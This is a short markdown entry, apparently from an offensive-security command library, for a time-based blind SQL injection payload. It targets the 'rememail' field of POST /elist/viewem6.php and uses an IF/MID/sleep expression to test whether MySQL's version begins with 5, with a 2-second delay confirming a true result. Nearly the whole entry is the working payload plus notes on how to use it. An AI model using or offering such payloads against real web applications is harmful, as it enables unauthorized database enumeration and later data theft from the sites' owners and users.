---
id: cmd-uuid-5
data: 'rememail=test@att.net''+IF(MID(@@version,1,1)=5,sleep(2),1)=2+'''
tags:
  - sqli
  - boolean
type: command
output: 2-second delay (true)
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.945Z'
verified: false
validated: true
submitted: true
---
# Version Check 5

## Command

```bash
# Burp Suite: POST /elist/viewem6.php
# Body: rememail=test@att.net'+IF(MID(@@version,1,1)=5,sleep(2),1)=2+'
```

## Description

Boolean payload to check if MySQL version starts with '5'.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rememail | IF condition payload | Yes |

## Examples

### Basic Usage

```bash
# As above
```

## Expected Output

Delay confirms true condition.

## Related

- [[procedures/Enumerate-MySQL-Version-Boolean-Queries]]
